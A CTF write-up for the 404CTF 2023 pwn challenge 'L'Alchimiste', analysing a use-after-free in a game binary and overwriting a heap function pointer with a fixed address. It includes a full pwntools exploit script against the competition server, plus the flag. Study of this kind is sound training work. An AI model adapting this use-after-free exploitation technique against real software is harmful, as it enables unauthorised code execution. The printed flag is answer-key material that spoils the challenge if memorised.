---
title: CTFs | 404CTF2023 |  PWN |  L'Alchimiste
author: Kaiba_404
date: 2023-06-05
categories: [CTFs, 404CTF2023, PWN]
tags: [CTF, 404CTF2023, pwn]
permalink: /CTFs/404CTF2023/pwn/lalchimiste
---

# L'alchimiste

![l_alchimistes](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/e8a7cd4f-01f1-40cf-84c2-dd1d88c3a731)

We are given the binary file [l_alchimiste](https://github.com/CongKhaiNGUYEN/congkhainguyen.github.io/tree/main/_posts/CTFs/404CTF2023/pwn/files/l_alchimiste)

Using `checksec` on this file

```shell
$ checksec l_alchimiste                         
[*] '/home/kali/Desktop/CTFs/404CTF/pwn/l_alchi/l_alchimiste'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

+ `Arch:` amd64-64-little: This indicates that the binary is built for the AMD64 architecture, which is a 64-bit architecture.

+ `RELRO:` Full RELRO: RELRO (Relocation Read-Only) is a security feature that protects against certain types of attacks. "Full RELRO" means that all relocations in the binary are read-only, providing enhanced protection against attacks such as GOT (Global Offset Table) overwrite.

+ `Stack:` Canary found: This indicates that a stack canary is present in the binary. A stack canary is a security mechanism that helps detect and prevent stack-based buffer overflows.

+ `NX:` NX enabled: NX (No-Execute) is a hardware feature that prevents executing code from regions of memory that are marked as non-executable. Enabling NX helps mitigate certain types of memory-based attacks, such as buffer overflow attacks that attempt to execute malicious code.

+ `PIE:` No PIE (0x400000): PIE (Position Independent Executable) is a security feature that randomizes the base address of the binary in memory, making it harder for attackers to exploit memory-based vulnerabilities. In this case, the binary does not have PIE enabled, and its base address is fixed at 0x400000.


Execute the ELF file

```shell
[Alchimiste] : En entrant ici, vous avez fait le premier pas vers l'aventure mystique de l'alchimie, où la recherche de la connaissance et de la sagesse est sans fin.
[Alchimiste] : Montrez-moi votre force et votre intelligence, et je vous donnerai la clé de la porte de la connaissance.

[Alchimiste] : N'hésitez pas à faire un tour dans mon modeste laboratoire, je suis sûr que vous trouverez quelque chose qui vous aidera à progresser.

1: Acheter un élixir de force
2: Consommer un élixir de force
3: Parler à l'alchimiste
4: Montrer mes caractéristiques
5: Obtenir la clé
6: Sortir du cabinet d'alchimie
```

We have 6 options as above, now let's analyze a bit more.

Use Ghidra to open binary files to find more information

![main_1_lalchi](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/2b9bd0e6-912f-409b-9e1f-c2173dc4bea1)

The special point here is that there is a character created with 3 arguments `100,0x32,100`.

![main_alchi](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/0b9c39a5-1c63-47d8-b3d1-8fc292384c09)

As we can see, there are 6 functions `(buyStrUpPotion, useItem, sendMessage, showStats,view_flag)` corresponding to 6 choices. Below is the breakdown of some important function.

**createCharacter**

![createChar](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/1aebaf27-33ad-418b-ba33-6b82539c3115)

![asm_createChar](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/d48f241e-45b9-4a2f-a8fc-8621caf1df1e)


Looking at the above function in both versions, we can see that this function creates a memory segment as shown below.

![memory_createChar](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/e270628e-098c-4b4d-990a-fe650f8cfd98)

**showStats**

![showStats](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/1f4b5b3a-2480-4b54-9e96-04af5d9e8d77)

From this function we can deduce the information as shown below

![getStats](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/af4d1633-05d4-4cc1-9eda-20a5ba0ae855)


Based on the implementation of the `showStats` and `showStat` functions, it can be deduced that our character is a structure consisting of four fields: 

+ FOR
+ INT
+ OR
+ a pointer (that is initialized as NULL)

**view_flag**

![view_flag](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/734a9616-faf2-4d0a-87c4-bf7fe71c9314)


As we can see in the picture above, `*param_1` and `param_1[1]` are `FOR` and `INT` respectively. So to read the flag, we need to make `FOR > 0x96=150` and `INT > 0x96=150`.


**incInt**

```c
void incInt(long param_1)

{
  *(int *)(param_1 + 4) = *(int *)(param_1 + 4) + 10;
  return;
}
```

increase INT by 10


**incStr**

```c
void incStr(int *param_1)

{
  *param_1 = *param_1 + 10;
  return;
}
```

increase FOR by 10


**buyStrUpPotion**

![buyStrUpPotion](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/31febef5-c8b9-4ee6-8fa4-71806cdcc78b)


![memo_buyStr](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/5fc9ba92-11e7-4750-9c26-3c8d9a64e84f)


The first image above with the color boxes is the corresponding code between C and assembly. The second figure shows the important pieces of memory created by the code.

> The function above will create a memory segment of 72 bytes and its address is stored in the pointer - the 4th field of our character.
{: .prompt-info}

> At the position of the last 8 bytes of the created memory, this function will store the address of the incStr function
{: .prompt-info}

**sendMessage**


```c
void sendMessage(void)

{
  void *__buf;
  
  __buf = malloc(0x48);
  printf("\n[Vous] : ");
  read(0,__buf,0x48);
  printf("***** ~ %p\n",__buf);
  return;
}
```
We have `malloc()` in this function. The malloc function here is very important because when we alternately call `free(), malloc(), free()`, the double-free() attack will not be detected. That can help us make a successful double-free() attack.

**useItem**

```c
void useItem(long param_1)

{
  if (*(long *)(param_1 + 0x10) == 0) {
    puts(&DAT_00400e38);
  }
  else {
    puts(&DAT_00400e7f);
    puts("***** Vous sentez votre force augmenter.");
    (**(code **)(*(long *)(param_1 + 0x10) + 0x40))(param_1);
    printf("***** ~ %p\n",*(undefined8 *)(param_1 + 0x10));
    free(*(void **)(param_1 + 0x10));
  }
  return;
}
```

In this function, we can observe that the call to `free(*(void **)(param_1 + 0x10));` has the potential to lead to a `Use-After-Free` or `Double-Free` vulnerable.


![memory_createChar](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/e270628e-098c-4b4d-990a-fe650f8cfd98)

This program examines the value at `param_1 + 0x10` (the 4th stat of the characters after "FOR", "INT", and "OR") to determine if it is zero or not. If the value is zero, the function will terminate. However, if the value is non-zero, the program will invoke the function pointer stored at this 4th param_1 stat position.

## Exploitation Plan

**Step_1** In the main function, we initially have enough money to purchase two potions for our character. However, by alternately buying potions and talking to the alchemist, we can continuously increase the stat. This is possible because the `useItem` function, as analyzed earlier, only checks the value at the 4th stat of the character. The free function only marks the memory as deallocated but does not nullify it, leading to a true Use-After-Free (UAF) vulnerability.

```python
def getStre():
    # choose sendMessage()
    p.sendlineafter(b"\n>>>",b"3")
    # saying something
    p.sendlineafter(b"[Vous] : ",b"ABCDEF")
    print(p.recvuntil(b'1:')[:-2].decode())
    # choose useItem() ---> execute incStr
    p.sendlineafter(b"\n>>>",b"2")
```

**Step 2** Once we have incremented the value for the "FOR" stat untils FOR>=150, we can take advantage of the remaining amount of money and the Double-Free vulnerability to overwrite the address of the `incInt` function into the current 4th stat of character. By doing so, we can modify the behavior of the program and achieve arbitrary code execution.

```python
# Because this binary file dont have PIE enable, so the address of all 
# instruction won't change. Therefore we can find incInt function address at 
# 0x4008d5 and use it to replace address of incStr
incInt = p64(0x4008d5)
p.sendlineafter(b"\n>>>",b"3")
# as described in the buyStrUpPotion function, incStr is located in the last
# 8 bytes in the 72/0x48 byte memory segment and we. So we need 0x40 letter 
# A to be able to reach and write to the last 8 bytes
payload = b'A'*0x40 + incInt
p.sendlineafter(b"[Vous] : ",payload)
p.sendlineafter(b"\n>>>",b"2")
```


**Step 3** We do the same as step 1 and done

```python
def getInt():
    # choose sendMessage()
    p.sendlineafter(b"\n>>>",b"3")
    # saying something
    p.sendlineafter(b"[Vous] : ",b'ABCDEF')
    # choose useItem() ---> execute incStr
    p.sendlineafter(b"\n>>>",b"2")
```

## The complete code

```python
from pwn import *

# p = process("./l_alchimiste")
p = remote("challenges.404ctf.fr",30944)

def getStre():
    p.sendlineafter(b"\n>>>",b"3")
    p.sendlineafter(b"[Vous] : ",b"ABCDEF")
    p.sendlineafter(b"\n>>>",b"2")


p.sendlineafter(b"\n>>>",b"1")
p.sendlineafter(b"\n>>>",b"2")

for _ in range(5):
    getStre()


# @incInt = 0x4008d5
incInt = p64(0x4008d5)
p.sendlineafter(b"\n>>>",b"3")
# try to overwrite last 8 bytes in 0x48 bytes segments
payload = b'A'*0x40 + incInt
p.sendlineafter(b"[Vous] : ",payload)
p.sendlineafter(b"\n>>>",b"2")

def getInt():
    p.sendlineafter(b"\n>>>",b"3")
    p.sendlineafter(b"[Vous] : ",'ABCDEF')
    p.sendlineafter(b"\n>>>",b"2")

for _ in range(12):
    getInt()

p.sendlineafter(b"\n>>>",b"5")

p.recvuntil(b'-----------------------------------------------')
print(p.recv().decode())

```


```shell
$ python3 exploit.py
[+] Opening connection to challenges.404ctf.fr on port 30944: Done

404CTF{P0UrQU01_P4Y3r_QU4ND_135_M075_5UFF153N7}

-----------------------------------------------

[*] Closed connection to challenges.404ctf.fr port 30944
```

**Flag:**  `404CTF{P0UrQU01_P4Y3r_QU4ND_135_M075_5UFF153N7}`